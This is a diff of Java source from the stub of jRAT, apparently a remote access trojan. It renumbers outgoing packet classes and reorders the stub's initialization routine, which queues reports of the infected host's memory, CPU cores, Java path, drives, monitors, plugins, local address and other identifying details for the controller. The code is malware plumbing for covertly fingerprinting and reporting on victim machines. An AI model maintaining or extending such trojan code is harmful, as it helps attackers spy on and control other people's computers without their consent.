@@ -29,13 +29,13 @@ import se.jrat.stub.packets.outgoing.Packet13InitTotalMemory;
 import se.jrat.stub.packets.outgoing.Packet13Status;
 import se.jrat.stub.packets.outgoing.Packet14InitAvailableCores;
 import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
-import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
-import se.jrat.stub.packets.outgoing.Packet36Initialized;
+import se.jrat.stub.packets.outgoing.Packet15InitJavaPath;
+import se.jrat.stub.packets.outgoing.Packet3Initialized;
 import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
 import se.jrat.stub.packets.outgoing.Packet5InitUserHost;
-import se.jrat.stub.packets.outgoing.Packet61InitMonitors;
-import se.jrat.stub.packets.outgoing.Packet62InitDrives;
-import se.jrat.stub.packets.outgoing.Packet67LoadedPlugins;
+import se.jrat.stub.packets.outgoing.Packet18InitMonitors;
+import se.jrat.stub.packets.outgoing.Packet17InitDrives;
+import se.jrat.stub.packets.outgoing.Packet16LoadedPlugins;
 import se.jrat.stub.packets.outgoing.Packet6InitVersion;
 import se.jrat.stub.packets.outgoing.Packet7InitServerID;
 import se.jrat.stub.packets.outgoing.Packet8InitCountry;
@@ -149,18 +149,12 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet12InitLocalAddress());
 		addToSendQueue(new Packet13InitTotalMemory());
 		addToSendQueue(new Packet14InitAvailableCores());
-
-		addToSendQueue(new Packet26InitJavaPath(System.getProperty("java.home")));
-
-		addToSendQueue(new Packet62InitDrives(File.listRoots()));
-
-
-
-		addToSendQueue(new Packet61InitMonitors(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()));
+		addToSendQueue(new Packet15InitJavaPath());
+		addToSendQueue(new Packet16LoadedPlugins());
+		addToSendQueue(new Packet17InitDrives());
+		addToSendQueue(new Packet18InitMonitors());	
 		
-		addToSendQueue(new Packet67LoadedPlugins()); // TODO
-		
-		addToSendQueue(new Packet36Initialized());
+		addToSendQueue(new Packet3Initialized());
 	}
 
 	public static void addToSendQueue(AbstractOutgoingPacket packet) {
